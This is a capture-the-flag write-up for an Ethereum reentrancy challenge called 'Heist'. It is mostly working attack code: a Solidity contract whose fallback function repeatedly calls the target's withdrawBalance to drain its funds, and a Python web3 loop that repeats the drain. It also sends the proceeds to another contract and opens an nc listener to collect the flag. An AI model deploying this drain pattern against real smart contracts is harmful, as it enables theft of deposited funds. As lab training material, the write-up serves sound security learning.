# Heist

This is an ethereum reentrancy vulnerability. We can deploy an attacker contract and use that to interact with the vulnerable ECorp contract which will drain all of its funds into our contract's address. The selfdestruct at the end transfers our contract's balance back to our personal account.

1. Deploy the exploit contract:

```Solidity
pragma solidity ^0.5.10;

import './ECorp.sol';

contract Exploit {
    ECorp public expl = ECorp(0xB36f4d32522A55B6cfb038F2F19b8A3d01D104f4);
    address payable owner;

    constructor() public {
        owner = msg.sender;
    }

    function startAttack() public payable {
        expl.withdrawBalance();
        selfdestruct(msg.sender);
    }

    function () payable external {
        expl.withdrawBalance();
    }
}
```

2. Call the contract using web3's python API:

```Python
def exploit(w3, exploit_contract):
    # Deploy the attack contract
    exploit_contract_address = deploy_contract(w3, account, exploit_contract)

    # Deposit an inital amount for the attack contract
    contract = ECorp(w3, account, ecorp_contract, ECORP_CONTRACT_ADDRESS)
    contract.deposit(exploit_contract_address, 100)

    # Exploit
    exploit = Exploit(w3, account, exploit_contract, exploit_contract_address)
    exploit.exploit()

while True:
    current_balance = getBalance(account.address)
    print(f"Current balance is: {current_balance}")
    if current_balance > 1000000:
        break
    exploit(w3, exploit_contract)
```

3. Send the 1m ether to the Offshore contract address:

```Python
win_tx = {
    'from': account.address,
    'to': OFFSHORE_CONTRACT_ADDRESS,
    'gas': 1000000,
    'gasPrice': w3.eth.gasPrice,
    'data': w3.toHex(b'172.17.0.3:1337'),
    'value': w3.toWei('1000000', 'ether'),
    'nonce': w3.eth.getTransactionCount(account.address)
}

signed = account.sign_transaction(win_tx)
tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)
```

4. Listen on port 1337 for the flag:

```
nc -lvp 1337
Connection from 192.168.1.206:38840
CUCTF{1M_4nd_A_Cl34n_G3Taw4Y}
```
